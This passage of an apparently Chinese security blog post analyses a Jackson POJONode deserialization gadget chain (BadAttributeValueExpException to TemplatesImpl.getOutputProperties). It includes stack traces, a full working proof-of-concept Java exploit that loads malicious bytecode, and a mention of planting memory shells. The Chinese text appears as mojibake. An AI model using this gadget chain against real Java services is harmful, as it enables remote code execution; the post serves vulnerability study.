</span></span><span class="line"><span class="cl"><span class="n">constructBeanSerializer</span><span class="p">:</span><span class="mi">368</span><span class="p">,</span> <span class="n">BeanSerializerFactory</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="o">.</span><span class="n">ser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">findBeanSerializer</span><span class="p">:</span><span class="mi">279</span><span class="p">,</span> <span class="n">BeanSerializerFactory</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="o">.</span><span class="n">ser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">_createSerializer2</span><span class="p">:</span><span class="mi">231</span><span class="p">,</span> <span class="n">BeanSerializerFactory</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="o">.</span><span class="n">ser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">createSerializer</span><span class="p">:</span><span class="mi">165</span><span class="p">,</span> <span class="n">BeanSerializerFactory</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="o">.</span><span class="n">ser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">_createUntypedSerializer</span><span class="p">:</span><span class="mi">1385</span><span class="p">,</span> <span class="n">SerializerProvider</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">_createAndCacheUntypedSerializer</span><span class="p">:</span><span class="mi">1336</span><span class="p">,</span> <span class="n">SerializerProvider</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">findValueSerializer</span><span class="p">:</span><span class="mi">510</span><span class="p">,</span> <span class="n">SerializerProvider</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">findTypedValueSerializer</span><span class="p">:</span><span class="mi">713</span><span class="p">,</span> <span class="n">SerializerProvider</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">serializeValue</span><span class="p">:</span><span class="mi">308</span><span class="p">,</span> <span class="n">DefaultSerializerProvider</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="o">.</span><span class="n">ser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">_configAndWriteValue</span><span class="p">:</span><span class="mi">3893</span><span class="p">,</span> <span class="n">ObjectMapper</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">writeValueAsString</span><span class="p">:</span><span class="mi">3207</span><span class="p">,</span> <span class="n">ObjectMapper</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">fasterxml</span><span class="o">.</span><span class="n">jackson</span><span class="o">.</span><span class="n">databind</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span><span class="p">:</span><span class="mi">16</span><span class="p">,</span> <span class="n">JSTest</span> <span class="p">(</span><span class="n">jackson</span><span class="p">)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">final</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">_accessorMethod</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">_field</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">bean</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="n">_accessorMethod</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">bean</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">Object</span><span class="o">[]</span><span class="p">)</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p><strong>getteræ–¹æ³•åå°„è°ƒç”¨ï¼Œåªè°ƒç”¨<code>æ— å‚æ–¹æ³•</code></strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">getJack:31, Person2 (jackson)
</span></span><span class="line"><span class="cl">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
</span></span><span class="line"><span class="cl">invoke:62, NativeMethodAccessorImpl (sun.reflect)
</span></span><span class="line"><span class="cl">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
</span></span><span class="line"><span class="cl">invoke:498, Method (java.lang.reflect)
</span></span><span class="line"><span class="cl">serializeAsField:687, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)
</span></span><span class="line"><span class="cl">serializeFields:719, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)
</span></span><span class="line"><span class="cl">serialize:155, BeanSerializer (com.fasterxml.jackson.databind.ser)
</span></span><span class="line"><span class="cl">_serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
</span></span><span class="line"><span class="cl">serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
</span></span><span class="line"><span class="cl">_configAndWriteValue:3893, ObjectMapper (com.fasterxml.jackson.databind)
</span></span><span class="line"><span class="cl">writeValueAsString:3207, ObjectMapper (com.fasterxml.jackson.databind)
</span></span><span class="line"><span class="cl">main:16, JSTest (jackson)
</span></span></code></pre></div><p>å¯¹æ¯”ä¸‹è°ƒç”¨æ ˆï¼Œå¤§æ¦‚æµç¨‹å°±æ˜¯</p>
<p><code>writeValueAsString()</code>ä¸€ç›´åˆ°=&gt;<code>DefaultSerializerProvider#serializeValue</code></p>
<ol>
<li>
<p>è¿™é‡Œ<code>findTypedValueSerializer()</code>ä¼šå…ˆå¯¹<code>Filed</code>å’Œ<code>Method</code>ï¼ˆåŒ…å«setterå’Œgetterï¼‰ï¼Œè¿›è¡Œåˆå§‹åŒ–</p>
</li>
<li>
<p>åœ¨<code>_serialize()</code>åå°„è°ƒç”¨è¿™äº›<code>Filed</code>å’Œ<code>Method</code>ï¼ˆæµ‹è¯•å‘ç°ï¼Œ<code>æœ‰å±æ€§çš„getteræ–¹æ³•</code>å’Œ<code>æ²¡æœ‰å±æ€§çš„getteræ–¹æ³•</code>éƒ½ä¼šè¢«è°ƒç”¨ï¼‰</p>
</li>
</ol>
<p><img loading="lazy" src="../images//image-20241114104044722.png" alt="image-20241114104044722"  />
</p>
<p>è°ƒç”¨çš„æ—¶å€™ï¼Œåœ¨<code>BeanSerializerBase#serializeFields</code>ä¼šé€šè¿‡<code>for</code>éœ€è¦æ ¹æ®å‰é¢<code>åˆå§‹åŒ–çš„prop</code>è°ƒç”¨<code>serializeAsField</code>ï¼Œæ³¨æ„ï¼Œè¿™é‡Œ<code>jack</code>ä¹Ÿæœ‰è‡ªå·±propå°½ç®¡ä»–æ²¡æœ‰å±æ€§ï¼Œä½†æ˜¯ä»–æœ‰<code>getter</code>ï¼Œå‰é¢èµ‹å€¼ä¼˜å…ˆèµ‹å€¼ç»™<code>Method</code>ï¼Œæ‰€ä»¥ä»–ä¹Ÿæœ‰è‡ªå·±propï¼Œæœ€åè°ƒç”¨<code>getJack()</code></p>
<p><img loading="lazy" src="../images//image-20241114105619470.png" alt="image-20241114105619470"  />
</p>
<p>ä½œä¸ºGadgetsçš„ä¸€ç¯ï¼Œæˆ‘ä»¬çŸ¥é“ä»–çš„ä½œç”¨å°±æ˜¯è°ƒç”¨ä»»æ„ç±»getteræ–¹æ³•å˜›ï¼Œæ— ç–‘GadgetsååŠæ®µå°±æ˜¯<code>TemplatesImpl.getOutputProperties()</code></p>
<h1 id="0x02-pojonode">0x02 POJONode<a hidden class="anchor" aria-hidden="true" href="#0x02-pojonode">#</a></h1>
<p><code>POJONode</code>çš„<code>toString</code>å¯ä»¥è°ƒç”¨<code>writeValueAsString()</code>ï¼Œä¸”å¯¹è±¡å¯æ§ï¼Œæˆ‘ä»¬æ€ä¹ˆè°ƒç”¨<code>toString</code>å‘¢ï¼Œè¿™é‡Œä¸éš¾æƒ³åˆ°åˆ©ç”¨CC5çš„<code>BadAttributeValueExpException</code>ï¼Œé‚£ä¹ˆGadgetså°±å®Œæ•´å•¦</p>
<p><img loading="lazy" src="../images//image-20241114160159735.png" alt="image-20241114160159735"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">InternalNodeMapper#nodeToString
</span></span></code></pre></div><p><img loading="lazy" src="../images//image-20241114163137443.png" alt="image-20241114163137443"  />
</p>
<h1 id="0x03-gadgets">0x03 Gadgets<a hidden class="anchor" aria-hidden="true" href="#0x03-gadgets">#</a></h1>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">BadAttributeValueExpException</span><span class="p">.</span><span class="na">readObject</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">POJONode</span><span class="p">.</span><span class="na">toString</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    	</span><span class="n">InternalNodeMapper</span><span class="err">#</span><span class="n">nodeToString</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    		</span><span class="nf">writeValueAsString</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    			</span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">getOutputProperties</span><span class="p">()</span><span class="w">
</span></span></span></code></pre></div><h3 id="é—®é¢˜1-writereplace">é—®é¢˜1 writeReplace()<a hidden class="anchor" aria-hidden="true" href="#é—®é¢˜1-writereplace">#</a></h3>
<p>æˆ‘ä»¬æ»¡å¿ƒæ¬¢å–œæ„é€ å¥½pocåï¼Œå‘ç°åºåˆ—åŒ–çš„æ—¶å°±é€€å‡ºç¨‹åºäº†ï¼Œå¸¸è§„ååºåˆ—åŒ–è¿™ä¸ªåœ°æ–¹ä¼šè°ƒç”¨<code>writeReplace()</code></p>
<p><img loading="lazy" src="../images//image-20241114163945086.png" alt="image-20241114163945086"  />
</p>
<p><code>writeReplace()</code>è¿™é‡Œå’Œ<code>toString()</code>å¯ä»¥èµ·åˆ°ä¸€æ ·çš„æ•ˆæœï¼Œåé¢ä¼šè°ƒç”¨åˆ°<code>writeValueAsBytes()</code>,åç»­ä¼š<code>æå‰</code>è°ƒç”¨<code>getteræ–¹æ³•</code>ï¼Œç„¶åæŠ¥é”™ä¸­æ–­</p>
<p><img loading="lazy" src="../images//image-20241114164222405.png" alt="image-20241114164222405"  />
</p>
<p><img loading="lazy" src="../images//image-20241114164445460.png" alt="image-20241114164445460"  />
</p>
<p><strong>è§£å†³ï¼š</strong></p>
<p>è‡ªæ„ä¸€ä¸ª<code>BaseJsonNode</code>å°†<code>writeReplace()</code>åˆ é™¤  //è¿™é‡Œåº”è¯¥æ˜¯è·ŸClassloadåŠ è½½çš„é—®é¢˜æœ‰å…³ï¼Œåé¢ç•™ä¸ªå‘</p>
<p>æ„é€ ä¸ªä¸€æ ·è·¯å¾„çš„ï¼Œç„¶åå°±å¯ä»¥æ‰“æˆåŠŸå•¦</p>
<p><img loading="lazy" src="../images//image-20241114170156770.png" alt="image-20241114170156770"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">jackson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.fasterxml.jackson.databind.node.POJONode</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.NotFoundException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.management.BadAttributeValueExpException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">jackson</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">Evil</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">code</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="s">&#34;111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_tfactory&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">TransformerFactoryImpl</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">POJONode</span><span class="w"> </span><span class="n">jsonNodes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">POJONode</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BadAttributeValueExpException</span><span class="w"> </span><span class="n">badAttributeValueExpException</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">BadAttributeValueExpException</span><span class="p">(</span><span class="n">111</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">badAttributeValueExpException</span><span class="p">,</span><span class="s">&#34;val&#34;</span><span class="p">,</span><span class="n">jsonNodes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">badAttributeValueExpException</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFiled</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">values</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">declaredField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">templates</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="n">values</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>ç½‘ä¸Šè¯´è¿™ä¸ªä¸ç¨³å®šï¼Œæœ¬åœ°è¯•äº†10æ¬¡éƒ½æ²¡é—®é¢˜ï¼Œå°±å…ˆä¸çœ‹</p>
<h2 id="å­˜æ¡£1-basejsonnode">å­˜æ¡£1 BaseJsonNode<a hidden class="anchor" aria-hidden="true" href="#å­˜æ¡£1-basejsonnode">#</a></h2>
<p>ä¸ºä»€ä¹ˆæœ¬åœ°é‡å†™<code>BaseJsonNode</code>å¯ä»¥è§£å†³é—®é¢˜1</p>
<h1 id="0x04-ä¸ç¨³å®š">0x04 ä¸ç¨³å®š<a hidden class="anchor" aria-hidden="true" href="#0x04-ä¸ç¨³å®š">#</a></h1>
<p>ä¹‹å‰è¯´ä¸€ç›´æ²¡é‡åˆ°hhhï¼Œåé¢æ‰“å†…å­˜é©¬çš„æ—¶å€™å‡ºç°äº†å¥½å‡ æ¬¡è¿™ä¸ªé—®é¢˜ï¼Œæ‰€ä»¥æ¥è¡¥ä¸‹è¿™ä¸ªå‘ã€‚å› ä¸ºè¿™ä¸ªæ˜¯æ¦‚ç‡è§¦å‘ï¼Œæ‰€ä»¥ä¸å¤ªå¥½æˆªå›¾</p>
<p>äº§ç”Ÿçš„åŸå› å‘¢æ˜¯åœ¨<code>jacksonè‡ªå·±çš„åºåˆ—åŒ–ä¸­</code>ï¼Œçœ‹åˆ°<code>serializeFields()</code></p>
<p>è¿™é‡Œæ˜¯forå¾ªç¯ï¼Œpropsæ˜¯ä¹‹å‰èµ‹å€¼çš„ï¼Œç„¶åæ ¹æ®<code>filedçš„åå­—</code>è°ƒç”¨å»è·å–å¯¹åº”çš„å€¼ï¼Œè¿™é‡Œåé¢å°±æ˜¯è°ƒç”¨<code>å¯¹åº”çš„getter</code>æˆ–è€…åå°„è·å–<code>filedå€¼</code>äº†ï¼Œé—®é¢˜å°±å‡ºåœ¨è¿™ä¸ªpropså€¼çš„é¡ºåºä¸Šï¼Œå¦‚æœç¬¬ä¸€ä¸ªå€¼æ˜¯<code>outputProperties</code>ï¼Œæœ€å…ˆè°ƒç”¨çš„å°±æ˜¯<code>getOutputProperties()</code>è‡ªç„¶å°±å¯ä»¥è°ƒç”¨æˆåŠŸã€‚</p>
<p>ä½†æ˜¯å¦‚æœæ˜¯å…¶ä»–å€¼å°±ä¼šæœ‰é—®é¢˜ï¼Œè¿™é‡Œå€¼åˆ†åˆ«æ˜¯<code>stylesheetDOM</code>ï¼Œ<code>transletIndex</code></p>
<p><img loading="lazy" src="../images/image-20241126101518613.png" alt="image-20241126101518613"  />
</p>
<p>è¿™ä¸¤ä¸ªå€¼å¯¹åº”ä¸¤ä¸ªgetteræ–¹æ³•<code>getStylesheetDOM()</code>,<code>getTransletIndex()</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">DOM</span><span class="w"> </span><span class="nf">getStylesheetDOM</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">DOM</span><span class="p">)</span><span class="n">_sdom</span><span class="p">.</span><span class="na">get</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">synchronized</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">getTransletIndex</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_class</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="n">defineTransletClasses</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">TransformerConfigurationException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Falls through</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">_transletIndex</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>å¦‚æœå…ˆ<code>getTransletIndex()</code>å†<code>getOutputProperties()</code>ä¹Ÿæ²¡äº‹ï¼Œ<code>getTransletIndex()</code>åªæ˜¯å¸®å¿™<code>åŠ è½½äº†å­—èŠ‚ç </code>ï¼Œä¸ä¼šç…§æˆå½±å“ã€‚</p>
<blockquote>
<p><strong>æœ‰é—®é¢˜åªæœ‰ä¸€ç§åœºæ™¯</strong>ï¼Œ<code>getStylesheetDOM</code>åœ¨<code>getOutputProperties</code>å‰é¢è°ƒç”¨</p>
<p>è¿™ä¸ªæ—¶å€™ä¼šåœ¨æ¶æ„ç±»å®ä¾‹åŒ–å‰è°ƒç”¨<code>getStylesheetDOM()</code>ï¼Œè€Œ<code>_sdom</code>æ˜¯<code>null</code>ï¼Œä¼šæŠ¥<code>ç©ºæŒ‡é’ˆ</code>çš„é”™è¯¯</p>
</blockquote>
<p>é‚£å¾ˆç®€å•å‘€æˆ‘ä»¬ç»™ä»–èµ‹äºˆä¸€ä¸ªå€¼ä¸å°±è¡Œäº†ï¼Œå…¶å®ä¸èƒ½wwwww</p>
<p>æˆ‘ä»¬çœ‹åˆ°<code>TemplatesImpl</code>å…¶å®ä¼šç»™è¿™ä¸ªèµ‹äºˆä¸€ä¸ª<code>ThreadLocal</code>å®ä¾‹ï¼Œé‚£ä¸ºä»€ä¹ˆæ˜¯<code>null</code>å‘¢</p>
